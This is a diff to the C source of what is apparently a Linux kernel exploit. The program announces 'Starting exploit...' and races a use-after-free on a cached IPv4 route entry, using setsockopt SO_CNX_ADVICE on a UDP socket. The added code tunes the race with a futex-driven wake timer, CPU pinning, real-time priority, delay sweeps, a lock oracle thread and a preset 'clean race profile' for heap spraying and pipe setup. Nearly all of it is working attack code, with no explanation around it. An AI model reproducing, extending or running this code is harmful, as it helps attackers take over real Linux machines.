@@ -80,9 +80,81 @@ typedef size_t usize;
     __res;                              \
 })
 
+#ifndef BAD_DST_CLEAN_PROFILE_DEFAULT
+#define BAD_DST_CLEAN_PROFILE_DEFAULT 0
+#endif
+
+static int clean_race_profile_state = -1;
+
+bool clean_race_profile_enabled() {
+    if (clean_race_profile_state != -1) {
+        return clean_race_profile_state != 0;
+    }
+
+    clean_race_profile_state = BAD_DST_CLEAN_PROFILE_DEFAULT ? 1 : 0;
+    const char *value = getenv("BAD_DST_CLEAN_RACE");
+    if (value && value[0]) {
+        char *end = NULL;
+        errno = 0;
+        unsigned long parsed = strtoul(value, &end, 0);
+        if (!errno && end != value && *end == '\0') {
+            clean_race_profile_state = parsed ? 1 : 0;
+        }
+    }
+
+    return clean_race_profile_state != 0;
+}
+
+bool clean_race_profile_default(const char *name, usize *default_value) {
+    if (!clean_race_profile_enabled()) {
+        return false;
+    }
+
+    static const struct {
+        const char *name;
+        usize value;
+    } defaults[] = {
+        { "BAD_DST_CPU1_BLOCK_RT", 0 },
+        { "BAD_DST_CPU1_BLOCK_THREADS", 256 },
+        { "BAD_DST_CPU1_RELEASE_SLEEP_US", 50000 },
+        { "BAD_DST_TRIGGER_RELEASE_TIMEOUT_US", 5000000 },
+        { "BAD_DST_LOCK_ORACLE", 0 },
+        { "BAD_DST_STACK_ORACLE", 0 },
+        { "BAD_DST_REQUIRE_STACK_TARGET", 0 },
+        { "BAD_DST_PRE_RACE_EXPIRE_US", 700000 },
+        { "BAD_DST_FNHE_EXPIRE_TOTAL_US", 1300000 },
+        { "BAD_DST_PREPARE_PAGE_PIPES_BEFORE_RACE", 1 },
+        { "BAD_DST_PREPARE_PIPES_BEFORE_RACE", 0 },
+        { "BAD_DST_EXPIRE_WITH_LOOKUP_ONLY", 0 },
+        { "BAD_DST_POST_RACE_SLEEP_US", 0 },
+        { "BAD_DST_POST_RACE_EXPIRE_US", 0 },
+        { "BAD_DST_FAKE_DST_OFFSET_MIX", 1 },
+        { "BAD_DST_ALIGN_PAD", 5 },
+        { "BAD_DST_TIMER_INITIAL_NS", 67194 },
+        { "BAD_DST_TRACE_MARKERS", 0 },
+        { "BAD_DST_STOP_AFTER_MSG_PROBE", 0 },
+        { "BAD_DST_LEAK_VULN_PIPES_ON_CLEAN_FAIL", 1 },
+        { "BAD_DST_TIMER_READ_TIMEOUT_US", 1000000 },
+        { "BAD_DST_SPRAY_BLOCK_US", 1000000 },
+    };
+
+    for (usize i = 0; i < sizeof(defaults) / sizeof(defaults[0]); i++) {
+        if (strcmp(name, defaults[i].name) == 0) {
+            *default_value = defaults[i].value;
+            return true;
+        }
+    }
+
+    return false;
+}
+
 usize env_usize(const char *name, usize default_value) {
     const char *value = getenv(name);
     if (!value || !value[0]) {
+        usize profile_default = 0;
+        if (clean_race_profile_default(name, &profile_default)) {
+            return profile_default;
+        }
         return default_value;
     }
 
@@ -458,9 +530,18 @@ typedef enum {
 } LockOracleState;
 
 typedef struct {
+    atomic_int done;
+    int socket_fd;
+    int result_errno;
+} LockOracleThreadState;
+
+typedef struct {
     LockOracleState state;
     pid_t pid;
     int result_errno;
+    bool uses_thread;
+    pthread_t thread;
+    LockOracleThreadState *thread_state;
 } LockOracleResult;
 
 const char *lock_oracle_state_name(LockOracleState state) {
@@ -498,6 +579,104 @@ bool wait_for_child_exit(pid_t pid, usize timeout_us) {
     }
 }
 
+void *run_ip_mtu_lock_oracle_thread(void *arg) {
+    LockOracleThreadState *state = (LockOracleThreadState *) arg;
+
+    int mtu = 0;
+    socklen_t mtu_len = sizeof(mtu);
+    long rc = syscall(SYS_getsockopt, state->socket_fd, IPPROTO_IP, IP_MTU,
+                      &mtu, &mtu_len);
+    state->result_errno = rc == 0 ? 0 : (errno ? errno : EIO);
+    atomic_store(&state->done, 1);
+    return NULL;
+}
+
+bool wait_for_lock_oracle_thread(LockOracleResult *result, usize timeout_us) {
+    if (!result->uses_thread || !result->thread_state) {
+        return true;
+    }
+
+    u64 deadline = now_ns() + timeout_us * 1000ull;
+    for (;;) {
+        if (atomic_load(&result->thread_state->done)) {
+            pthread_join(result->thread, NULL);
+            free(result->thread_state);
+            result->thread_state = NULL;
+            result->uses_thread = false;
+            return true;
+        }
+        if (now_ns() >= deadline) {
+            return false;
+        }
+        sleep_us_checked(env_usize("BAD_DST_LOCK_ORACLE_THREAD_POLL_US", 50));
+    }
+}
+
+bool wait_for_lock_oracle_release(LockOracleResult *result, usize timeout_us) {
+    if (result->uses_thread) {
+        return wait_for_lock_oracle_thread(result, timeout_us);
+    }
+    return wait_for_child_exit(result->pid, timeout_us);
+}
+
+LockOracleResult run_ip_mtu_lock_oracle_pthread(int socket_fd, usize timeout_us) {
+    LockOracleResult result = {
+        .state = LOCK_ORACLE_FAILED,
+        .pid = -1,
+        .result_errno = 0,
+        .uses_thread = false,
+        .thread_state = NULL,
+    };
+
+    LockOracleThreadState *state = calloc(1, sizeof(*state));
+    if (!state) {
+        LOG("lock oracle thread allocation failed");
+        result.result_errno = ENOMEM;
+        return result;
+    }
+    state->socket_fd = socket_fd;
+    atomic_store(&state->done, 0);
+
+    int rc = pthread_create(&result.thread, NULL,
+                            run_ip_mtu_lock_oracle_thread, state);
+    if (rc != 0) {
+        LOG("lock oracle pthread_create failed: errno=%d", rc);
+        free(state);
+        result.result_errno = rc;
+        return result;
+    }
+
+    result.uses_thread = true;
+    result.thread_state = state;
+
+    u64 deadline = now_ns() + timeout_us * 1000ull;
+    for (;;) {
+        if (atomic_load(&state->done)) {
+            pthread_join(result.thread, NULL);
+            result.uses_thread = false;
+            result.thread_state = NULL;
+
+            if (state->result_errno == 0) {
+                result.state = LOCK_ORACLE_DONE_OK;
+                result.result_errno = 0;
+            } else {
+                result.state = LOCK_ORACLE_DONE_ERR;
+                result.result_errno = state->result_errno;
+            }
+            free(state);
+            return result;
+        }
+
+        if (now_ns() >= deadline) {
+            result.state = LOCK_ORACLE_BLOCKED;
+            result.result_errno = 0;
+            return result;
+        }
+
+        sleep_us_checked(env_usize("BAD_DST_LOCK_ORACLE_THREAD_POLL_US", 50));
+    }
+}
+
 void close_inherited_fds_except(int keep_fd) {
     struct rlimit rl = { 0 };
     usize max_fds = 32768;
@@ -516,10 +695,16 @@ void close_inherited_fds_except(int keep_fd) {
 }
 
 LockOracleResult run_ip_mtu_lock_oracle(int socket_fd, usize timeout_us) {
+    if (env_usize("BAD_DST_LOCK_ORACLE_THREAD", 0)) {
+        return run_ip_mtu_lock_oracle_pthread(socket_fd, timeout_us);
+    }
+
     LockOracleResult result = {
         .state = LOCK_ORACLE_FAILED,
         .pid = -1,
         .result_errno = 0,
+        .uses_thread = false,
+        .thread_state = NULL,
     };
 
     pid_t pid = fork();
@@ -655,6 +840,19 @@ u64 race_pulse_ns_for_attempt(usize attempt) {
 
     u64 sweep_start = env_usize("BAD_DST_RACE_PULSE_START_NS", 0);
     u64 sweep_step = env_usize("BAD_DST_RACE_PULSE_STEP_NS", 1000);
+    usize sweep_index = (attempt - 1) % sweep_count;
+
+    return sweep_start + sweep_index * sweep_step;
+}
+
+u64 pre_syscall_delay_ns_for_attempt(usize attempt) {
+    usize sweep_count = env_usize("BAD_DST_PRE_SYSCALL_DELAY_SWEEP_COUNT", 0);
+    if (sweep_count == 0) {
+        return env_usize("BAD_DST_PRE_SYSCALL_DELAY_NS", 0);
+    }
+
+    u64 sweep_start = env_usize("BAD_DST_PRE_SYSCALL_DELAY_START_NS", 0);
+    u64 sweep_step = env_usize("BAD_DST_PRE_SYSCALL_DELAY_STEP_NS", 1000);
     usize sweep_index = (attempt - 1) % sweep_count;
 
     return sweep_start + sweep_index * sweep_step;
@@ -1927,6 +2125,43 @@ Pipe leaked_vuln_pipes[MAX_LEAKED_VULN_PIPES] = { 0 };
 bool leaked_vuln_pipe_ignored[MAX_LEAKED_VULN_PIPES] = { 0 };
 usize leaked_vuln_pipe_count = 0;
 
+typedef enum {
+    TRIGGER_STAGE_IDLE = 0,
+    TRIGGER_STAGE_WOKEN,
+    TRIGGER_STAGE_TIMER_ARMED,
+    TRIGGER_STAGE_FUTEX_WAKE_REQUESTED,
+    TRIGGER_STAGE_PRE_SYSCALL_DELAY,
+    TRIGGER_STAGE_AFTER_PRE_SYSCALL_DELAY,
+    TRIGGER_STAGE_SETSOCKOPT_ENTER,
+    TRIGGER_STAGE_SETSOCKOPT_EXIT,
+    TRIGGER_STAGE_DONE,
+} TriggerStage;
+
+const char *trigger_stage_name(int stage) {
+    switch (stage) {
+    case TRIGGER_STAGE_IDLE:
+        return "idle";
+    case TRIGGER_STAGE_WOKEN:
+        return "woken";
+    case TRIGGER_STAGE_TIMER_ARMED:
+        return "timer_armed";
+    case TRIGGER_STAGE_FUTEX_WAKE_REQUESTED:
+        return "futex_wake_requested";
+    case TRIGGER_STAGE_PRE_SYSCALL_DELAY:
+        return "pre_syscall_delay";
+    case TRIGGER_STAGE_AFTER_PRE_SYSCALL_DELAY:
+        return "after_pre_syscall_delay";
+    case TRIGGER_STAGE_SETSOCKOPT_ENTER:
+        return "setsockopt_enter";
+    case TRIGGER_STAGE_SETSOCKOPT_EXIT:
+        return "setsockopt_exit";
+    case TRIGGER_STAGE_DONE:
+        return "done";
+    default:
+        return "unknown";
+    }
+}
+
 ssize_t remember_leaked_vuln_pipes(Pipe *pipes, usize count) {
     usize max_leaked = env_usize("BAD_DST_MAX_LEAKED_VULN_PIPES", MAX_LEAKED_VULN_PIPES);
     max_leaked = min_usize(max_leaked, MAX_LEAKED_VULN_PIPES);
@@ -2134,6 +2369,9 @@ typedef struct {
     atomic_int cpu1_blocker_ready_counter;
     atomic_int cpu0_noise_epoch;
     atomic_int cpu0_noise_ready_counter;
+    atomic_int futex_timer_request;
+    atomic_int futex_timer_done;
+    atomic_int futex_timer_ready_counter;
     // atomic_int timer_wakeup;
     int timer_fd;
     atomic_int vuln_socket;
@@ -2144,8 +2382,18 @@ typedef struct {
     usize align_pad;
     atomic_int trigger_thread;
     atomic_int trigger_done_counter;
+    atomic_int trigger_timing_diag;
+    atomic_int trigger_stage;
+    atomic_ulong trigger_timer_armed_ns;
+    atomic_ulong trigger_futex_wake_ns;
+    atomic_ulong trigger_futex_pin_ns;
+    atomic_ulong trigger_delay_enter_ns;
+    atomic_ulong trigger_delay_exit_ns;
+    atomic_ulong trigger_setsockopt_enter_ns;
+    atomic_ulong trigger_setsockopt_exit_ns;
     Pipe sync_pipe_to_trigger;
     u64 timer_offset;
+    atomic_ulong pre_syscall_delay_ns;
     u64 critical_start_ns;
 } TriggerCtx;
 
@@ -2158,6 +2406,76 @@ typedef struct {
     TriggerCtx *ctx;
     usize index;
 } Cpu0NoiseArg;
+
+typedef struct {
+    TriggerCtx *ctx;
+} FutexTimerArg;
+
+i64 timestamp_age_us(u64 now, u64 timestamp) {
+    if (timestamp == 0) {
+        return -1;
+    }
+    return (i64) ((now - timestamp) / 1000);
+}
+
+void reset_trigger_timing_diag(TriggerCtx *ctx) {
+    if (!atomic_load(&ctx->trigger_timing_diag)) {
+        return;
+    }
+
+    atomic_store(&ctx->trigger_stage, TRIGGER_STAGE_IDLE);
+    atomic_store(&ctx->trigger_timer_armed_ns, 0);
+    atomic_store(&ctx->trigger_futex_wake_ns, 0);
+    atomic_store(&ctx->trigger_futex_pin_ns, 0);
+    atomic_store(&ctx->trigger_delay_enter_ns, 0);
+    atomic_store(&ctx->trigger_delay_exit_ns, 0);
+    atomic_store(&ctx->trigger_setsockopt_enter_ns, 0);
+    atomic_store(&ctx->trigger_setsockopt_exit_ns, 0);
+}
+
+void store_trigger_stage(TriggerCtx *ctx, TriggerStage stage, atomic_ulong *timestamp) {
+    if (!atomic_load(&ctx->trigger_timing_diag)) {
+        return;
+    }
+
+    if (timestamp) {
+        atomic_store(timestamp, now_ns());
+    }
+    atomic_store(&ctx->trigger_stage, stage);
+}
+
+void log_trigger_timing_diag(TriggerCtx *ctx, usize attempt, const char *where) {
+    if (!atomic_load(&ctx->trigger_timing_diag)) {
+        return;
+    }
+
+    u64 observed_ns = now_ns();
+    int stage = atomic_load(&ctx->trigger_stage);
+    u64 timer_armed_ns = atomic_load(&ctx->trigger_timer_armed_ns);
+    u64 futex_wake_ns = atomic_load(&ctx->trigger_futex_wake_ns);
+    u64 futex_pin_ns = atomic_load(&ctx->trigger_futex_pin_ns);
+    u64 delay_enter_ns = atomic_load(&ctx->trigger_delay_enter_ns);
+    u64 delay_exit_ns = atomic_load(&ctx->trigger_delay_exit_ns);
+    u64 setsockopt_enter_ns = atomic_load(&ctx->trigger_setsockopt_enter_ns);
+    u64 setsockopt_exit_ns = atomic_load(&ctx->trigger_setsockopt_exit_ns);
+
+    LOG("timing diag attempt=%lu where=%s stage=%s(%d) "
+        "age_us armed=%ld futex_wake=%ld futex_pin=%ld delay_enter=%ld delay_exit=%ld setsockopt_enter=%ld setsockopt_exit=%ld",
+        attempt,
+        where,
+        trigger_stage_name(stage),
+        stage,
+        timestamp_age_us(observed_ns, timer_armed_ns),
+        timestamp_age_us(observed_ns, futex_wake_ns),
+        timestamp_age_us(observed_ns, futex_pin_ns),
+        timestamp_age_us(observed_ns, delay_enter_ns),
+        timestamp_age_us(observed_ns, delay_exit_ns),
+        timestamp_age_us(observed_ns, setsockopt_enter_ns),
+        timestamp_age_us(observed_ns, setsockopt_exit_ns));
+
+    trace_marker("attempt=%lu stage=timing_diag where=%s trigger_stage=%s",
+        attempt, where, trigger_stage_name(stage));
+}
 
 void wake_cpu0_noise_threads(TriggerCtx *ctx) {
     atomic_fetch_add(&ctx->cpu0_noise_epoch, 1);
@@ -2225,6 +2543,106 @@ void *run_cpu0_noise_thread(void *arg) {
                 sched_yield();
             }
         }
+    }
+
+    return NULL;
+}
+
+bool futex_wake_timer_enabled() {
+    return env_usize("BAD_DST_FUTEX_WAKE_TIMER", 0) ? true : false;
+}
+
+void wake_futex_timer_thread(TriggerCtx *ctx) {
+    atomic_fetch_add(&ctx->futex_timer_request, 1);
+    (void) syscall(
+        SYS_futex,
+        (int *) &ctx->futex_timer_request,
+        FUTEX_WAKE_PRIVATE,
+        1,
+        NULL,
+        NULL,
+        0);
+}
+
+void wait_futex_timer_request(TriggerCtx *ctx, int *seen_request) {
+    for (;;) {
+        int request = atomic_load(&ctx->futex_timer_request);
+        if (request != *seen_request) {
+            *seen_request = request;
+            return;
+        }
+
+        int rc = (int) syscall(
+            SYS_futex,
+            (int *) &ctx->futex_timer_request,
+            FUTEX_WAIT_PRIVATE,
+            *seen_request,
+            NULL,
+            NULL,
+            0);
+        if (rc == -1 && errno != EAGAIN && errno != EINTR) {
+            LOG("futex timer request wait failed errno=%d", errno);
+            sleep_us_checked(1000);
+        }
+    }
+}
+
+void *run_futex_timer_thread(void *arg) {
+    FutexTimerArg *timer = (FutexTimerArg *) arg;
+    TriggerCtx *ctx = timer->ctx;
+
+    int default_cpu = online_cpu_count() > 2 ? 2 : 1;
+    int cpu = (int) env_usize("BAD_DST_FUTEX_WAKE_CPU", (usize) default_cpu);
+    pin_to_cpu(cpu);
+
+    if (env_usize("BAD_DST_FUTEX_WAKE_RT", 0)) {
+        int priority = (int) env_usize("BAD_DST_FUTEX_WAKE_RT_PRIO", 70);
+        try_make_thread_fifo("futex wake timer", priority);
+    } else if (env_usize("BAD_DST_FUTEX_WAKE_IDLE", 0)) {
+        make_thread_idle();
+    } else {
+        int nice_value = (int) env_usize("BAD_DST_FUTEX_WAKE_NICE", 0);
+        (void) setpriority(PRIO_PROCESS, 0, nice_value);
+        LOG("futex wake timer: cpu=%d nice=%d", cpu, nice_value);
+    }
+
+    atomic_fetch_add(&ctx->futex_timer_ready_counter, 1);
+
+    int seen_request = atomic_load(&ctx->futex_timer_request);
+    for (;;) {
+        wait_futex_timer_request(ctx, &seen_request);
+
+        u64 delay_ns = ctx->timer_offset;
+        if (env_usize("BAD_DST_FUTEX_WAKE_USE_SPIN", 1)) {
+            spin_wait_ns(delay_ns);
+        } else {
+            sleep_ns_checked(delay_ns);
+        }
+
+        if (atomic_load(&ctx->trigger_timing_diag)) {
+            atomic_store(&ctx->trigger_futex_wake_ns, now_ns());
+        }
+
+        if (env_usize("BAD_DST_FUTEX_WAKE_PIN_TRIGGER", 0)) {
+            pid_t trigger_pid = atomic_load(&ctx->trigger_thread);
+            int target_cpu = (int) env_usize("BAD_DST_FUTEX_WAKE_PIN_CPU", 1);
+            if (trigger_pid > 0) {
+                pin_thread_to_cpu(trigger_pid, target_cpu);
+            }
+            if (atomic_load(&ctx->trigger_timing_diag)) {
+                atomic_store(&ctx->trigger_futex_pin_ns, now_ns());
+            }
+        }
+
+        atomic_fetch_add(&ctx->futex_timer_done, 1);
+        (void) syscall(
+            SYS_futex,
+            (int *) &ctx->futex_timer_done,
+            FUTEX_WAKE_PRIVATE,
+            1,
+            NULL,
+            NULL,
+            0);
     }
 
     return NULL;
@@ -2306,6 +2724,7 @@ void *run_cpu1_block_thread(void *arg) {
 void *run_trigger_thread(void *arg) {
     TriggerCtx *ctx = (TriggerCtx *) arg;
     atomic_store(&ctx->trigger_thread, syscall(SYS_gettid));
+    bool use_futex_wake_timer = futex_wake_timer_enabled();
 
     pin_to_cpu(0);
     make_thread_idle();
@@ -2316,6 +2735,7 @@ void *run_trigger_thread(void *arg) {
         // where ready counter is still 2
         u8 buf = 0;
         SYSCHK(read(ctx->sync_pipe_to_trigger.read_fd, &buf, sizeof(buf)));
+        store_trigger_stage(ctx, TRIGGER_STAGE_WOKEN, NULL);
 
         // wait for other threads to be ready
         while (atomic_load(&ctx->ready_counter) < 2) {}
@@ -2329,18 +2749,39 @@ void *run_trigger_thread(void *arg) {
         // read socket fd before setting timer, if timer expires before setsockopt main thread might change socket
         int socket_fd = atomic_load(&ctx->vuln_socket);
 
-        // arm timer
-        struct itimerspec spec = { 0 };
-        spec.it_value = ns_to_timespec(now_ns() + ctx->timer_offset);
-        SYSCHK(timerfd_settime(ctx->timer_fd, TFD_TIMER_ABSTIME, &spec, NULL));
+        if (use_futex_wake_timer) {
+            store_trigger_stage(ctx, TRIGGER_STAGE_FUTEX_WAKE_REQUESTED,
+                                &ctx->trigger_timer_armed_ns);
+            wake_futex_timer_thread(ctx);
+        } else {
+            // arm timer
+            struct itimerspec spec = { 0 };
+            spec.it_value = ns_to_timespec(now_ns() + ctx->timer_offset);
+            SYSCHK(timerfd_settime(ctx->timer_fd, TFD_TIMER_ABSTIME, &spec, NULL));
+            store_trigger_stage(ctx, TRIGGER_STAGE_TIMER_ARMED,
+                                &ctx->trigger_timer_armed_ns);
+        }
         if (env_usize("BAD_DST_CPU0_NOISE_AFTER_TIMER_ARM", 0)) {
             wake_cpu0_noise_threads(ctx);
+        }
+        u64 pre_syscall_delay_ns = atomic_load(&ctx->pre_syscall_delay_ns);
+        if (pre_syscall_delay_ns != 0) {
+            store_trigger_stage(ctx, TRIGGER_STAGE_PRE_SYSCALL_DELAY,
+                                &ctx->trigger_delay_enter_ns);
+            spin_wait_ns(pre_syscall_delay_ns);
+            store_trigger_stage(ctx, TRIGGER_STAGE_AFTER_PRE_SYSCALL_DELAY,
+                                &ctx->trigger_delay_exit_ns);
         }
 
         int one = 1;
         // don't check result, socket might be closed
+        store_trigger_stage(ctx, TRIGGER_STAGE_SETSOCKOPT_ENTER,
+                            &ctx->trigger_setsockopt_enter_ns);
         setsockopt(socket_fd, SOL_SOCKET, SO_CNX_ADVICE, &one, sizeof(one));
+        store_trigger_stage(ctx, TRIGGER_STAGE_SETSOCKOPT_EXIT,
+                            &ctx->trigger_setsockopt_exit_ns);
         atomic_fetch_add(&ctx->trigger_done_counter, 1);
+        store_trigger_stage(ctx, TRIGGER_STAGE_DONE, NULL);
     }
 }
 
@@ -2417,6 +2858,39 @@ bool read_timerfd_expiration(int timer_fd, u64 *result, usize timeout_us) {
 
         LOG("timerfd read failed: got=%ld errno=%d", (long) got, errno);
         return false;
+    }
+}
+
+bool wait_for_futex_timer_done(TriggerCtx *ctx, int done_before, usize timeout_us) {
+    u64 deadline = now_ns() + timeout_us * 1000ull;
+
+    for (;;) {
+        int done = atomic_load(&ctx->futex_timer_done);
+        if (done > done_before) {
+            return true;
+        }
+
+        u64 now = now_ns();
+        if (now >= deadline) {
+            return false;
+        }
+
+        struct timespec timeout = ns_to_timespec(deadline - now);
+        int rc = (int) syscall(
+            SYS_futex,
+            (int *) &ctx->futex_timer_done,
+            FUTEX_WAIT_PRIVATE,
+            done,
+            &timeout,
+            NULL,
+            0);
+        if (rc == -1 && errno == ETIMEDOUT) {
+            return atomic_load(&ctx->futex_timer_done) > done_before;
+        }
+        if (rc == -1 && errno != EAGAIN && errno != EINTR) {
+            LOG("futex timer done wait failed errno=%d", errno);
+            sleep_us_checked(1000);
+        }
     }
 }
 
@@ -2499,6 +2973,8 @@ void trigger_vuln_loop() {
     Cpu1BlockerArg cpu1_block_args[MAX_CPU1_BLOCK_THREADS] = { 0 };
     pthread_t cpu0_noise_threads[MAX_CPU0_NOISE_THREADS] = { 0 };
     Cpu0NoiseArg cpu0_noise_args[MAX_CPU0_NOISE_THREADS] = { 0 };
+    pthread_t futex_timer_thread = { 0 };
+    FutexTimerArg futex_timer_arg = { 0 };
     pthread_t trigger_thread = { 0 };
 
     TriggerCtx ctx = {
@@ -2507,6 +2983,9 @@ void trigger_vuln_loop() {
         .cpu1_blocker_ready_counter = 0,
         .cpu0_noise_epoch = 0,
         .cpu0_noise_ready_counter = 0,
+        .futex_timer_request = 0,
+        .futex_timer_done = 0,
+        .futex_timer_ready_counter = 0,
         .timer_fd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC | TFD_NONBLOCK)),
         .vuln_socket = 0,
         .pre_sockets = { 0 },
@@ -2516,12 +2995,32 @@ void trigger_vuln_loop() {
         .align_pad = 0,
         .trigger_thread = 0,
         .trigger_done_counter = 0,
+        .trigger_timing_diag = env_usize("BAD_DST_TRIGGER_TIMING_DIAG", 0),
+        .trigger_stage = TRIGGER_STAGE_IDLE,
+        .trigger_timer_armed_ns = 0,
+        .trigger_futex_wake_ns = 0,
+        .trigger_futex_pin_ns = 0,
+        .trigger_delay_enter_ns = 0,
+        .trigger_delay_exit_ns = 0,
+        .trigger_setsockopt_enter_ns = 0,
+        .trigger_setsockopt_exit_ns = 0,
         .sync_pipe_to_trigger = open_pipe(),
         .timer_offset = env_usize("BAD_DST_TIMER_INITIAL_NS", 20000),
+        .pre_syscall_delay_ns = 0,
         .critical_start_ns = 0,
     };
 
 #ifndef DEBUG
+    bool use_futex_wake_timer = futex_wake_timer_enabled();
+    if (use_futex_wake_timer) {
+        futex_timer_arg.ctx = &ctx;
+        SYSCHK(pthread_create(&futex_timer_thread, NULL,
+                              run_futex_timer_thread,
+                              (void *) &futex_timer_arg));
+        pthread_detach(futex_timer_thread);
+        while (atomic_load(&ctx.futex_timer_ready_counter) < 1) {}
+    }
+
     usize cpu0_noise_thread_count = env_usize("BAD_DST_CPU0_NOISE_THREADS", 0);
     cpu0_noise_thread_count = min_usize(cpu0_noise_thread_count, MAX_CPU0_NOISE_THREADS);
     if (cpu0_noise_thread_count != 0) {
@@ -2653,6 +3152,8 @@ void trigger_vuln_loop() {
 
     for (usize attempt = 1; max_attempts == 0 || attempt <= max_attempts; attempt++) {
         ctx.timer_offset = timer_offset_for_attempt(ctx.timer_offset, attempt);
+        u64 pre_syscall_delay_ns = pre_syscall_delay_ns_for_attempt(attempt);
+        atomic_store(&ctx.pre_syscall_delay_ns, pre_syscall_delay_ns);
 
         usize align_pad = fixed_align_pad == (usize)-1 ?
             ((attempt - 1) % NUM_ALIGN_PAD_SOCKETS) :
@@ -2663,12 +3164,16 @@ void trigger_vuln_loop() {
         ctx.align_pad = align_pad;
         ExploitPipeSet prepared_pipes = { 0 };
 
-        LOG("start real race attempt=%lu align_pad=%lu pre=%lu post=%lu timer_offset=%lu",
-            attempt, align_pad, ctx.pre_socket_count, ctx.post_socket_count, ctx.timer_offset);
+        LOG("start real race attempt=%lu align_pad=%lu pre=%lu post=%lu timer_offset=%lu pre_syscall_delay=%lu",
+            attempt, align_pad, ctx.pre_socket_count, ctx.post_socket_count,
+            ctx.timer_offset, pre_syscall_delay_ns);
         trace_marker_attempt = attempt;
-        trace_marker("attempt=%lu stage=start align=%lu pre=%lu post=%lu timer=%lu",
-            attempt, align_pad, ctx.pre_socket_count, ctx.post_socket_count, ctx.timer_offset);
-        drain_timerfd(ctx.timer_fd);
+        trace_marker("attempt=%lu stage=start align=%lu pre=%lu post=%lu timer=%lu pre_syscall_delay=%lu",
+            attempt, align_pad, ctx.pre_socket_count, ctx.post_socket_count,
+            ctx.timer_offset, pre_syscall_delay_ns);
+        if (!use_futex_wake_timer) {
+            drain_timerfd(ctx.timer_fd);
+        }
 
         open_many_sockets(ctx.pre_sockets, ctx.pre_socket_count);
         ctx.vuln_socket = open_vuln_ipv4_udp_socket();
@@ -2685,7 +3190,9 @@ void trigger_vuln_loop() {
             attempt, pre_race_expire_us, exploit_pipe_set_has_active(&prepared_pipes));
 
         u64 trigger_done_before = (u64) atomic_load(&ctx.trigger_done_counter);
+        int futex_done_before = atomic_load(&ctx.futex_timer_done);
         set_cpu1_block_state(&ctx, 1);
+        reset_trigger_timing_diag(&ctx);
 
         // let trigger know it can continue another iteration
         u8 buf = 0;
@@ -2700,11 +3207,20 @@ void trigger_vuln_loop() {
         atomic_fetch_add(&ctx.ready_counter, 1);
         u64 result = 0;
         usize timer_read_timeout_us = env_usize("BAD_DST_TIMER_READ_TIMEOUT_US", 1000000);
-        if (!read_timerfd_expiration(ctx.timer_fd, &result, timer_read_timeout_us)) {
+        bool timer_ready = use_futex_wake_timer ?
+            wait_for_futex_timer_done(&ctx, futex_done_before, timer_read_timeout_us) :
+            read_timerfd_expiration(ctx.timer_fd, &result, timer_read_timeout_us);
+        if (!timer_ready) {
             atomic_fetch_sub(&ctx.ready_counter, 1);
-            LOG("timerfd read timeout after %lu us; retrying race attempt", timer_read_timeout_us);
-            trace_marker("attempt=%lu stage=timer_read_timeout timeout_us=%lu",
-                attempt, timer_read_timeout_us);
+            log_trigger_timing_diag(&ctx, attempt,
+                use_futex_wake_timer ? "futex_timer_timeout" : "timer_timeout");
+            LOG("%s timeout after %lu us; retrying race attempt",
+                use_futex_wake_timer ? "futex wake timer" : "timerfd read",
+                timer_read_timeout_us);
+            trace_marker("attempt=%lu stage=timer_read_timeout source=%s timeout_us=%lu",
+                attempt,
+                use_futex_wake_timer ? "futex" : "timerfd",
+                timer_read_timeout_us);
 
             (void) release_frozen_trigger(&ctx, trigger_pid, trigger_done_before);
             SYSCHK(close(ctx.vuln_socket));
@@ -2714,12 +3230,15 @@ void trigger_vuln_loop() {
             continue;
         }
         atomic_fetch_sub(&ctx.ready_counter, 1); // no longer ready
-        trace_marker("attempt=%lu stage=after_timer_read result=%lu",
-            attempt, result);
+        log_trigger_timing_diag(&ctx, attempt,
+            use_futex_wake_timer ? "after_futex_timer" : "after_timer_read");
+        trace_marker("attempt=%lu stage=after_timer_read source=%s result=%lu",
+            attempt, use_futex_wake_timer ? "futex" : "timerfd", result);
 
         // move trigger thread to cpu, so we can sleep and such and not worry about blocking
         int pin_rc = pin_thread_to_cpu(trigger_pid, 1);
         int pin_errno = errno;
+        log_trigger_timing_diag(&ctx, attempt, "after_pin_trigger");
         trace_marker("attempt=%lu stage=after_pin_trigger rc=%d errno=%d",
             attempt, pin_rc, pin_errno);
 
@@ -2815,7 +3334,8 @@ void trigger_vuln_loop() {
                     sleep(1000);
                 }
             }
-            wait_for_child_exit(lock_oracle.pid, env_usize("BAD_DST_LOCK_ORACLE_REAP_US", 200000));
+            wait_for_lock_oracle_release(&lock_oracle,
+                env_usize("BAD_DST_LOCK_ORACLE_REAP_US", 200000));
             SYSCHK(close(ctx.vuln_socket));
             close_fds(ctx.pre_sockets, ctx.pre_socket_count);
             close_prepared_exploit_pipes(&prepared_pipes, false, "miss after freeze");
@@ -2854,7 +3374,8 @@ void trigger_vuln_loop() {
                 sleep(1000);
             }
         }
-        wait_for_child_exit(lock_oracle.pid, env_usize("BAD_DST_LOCK_ORACLE_REAP_US", 200000));
+        wait_for_lock_oracle_release(&lock_oracle,
+            env_usize("BAD_DST_LOCK_ORACLE_REAP_US", 200000));
         SYSCHK(close(ctx.vuln_socket));
 
         // also prepare spray again
@@ -3403,6 +3924,9 @@ int set_hard_file_limit(rlim_t new_limit) {
 
 int main() {
     puts("Starting exploit...");
+    if (clean_race_profile_enabled()) {
+        LOG("clean IPv4 race profile enabled");
+    }
 
     set_hard_file_limit(32768);
     set_soft_file_limit(32768);
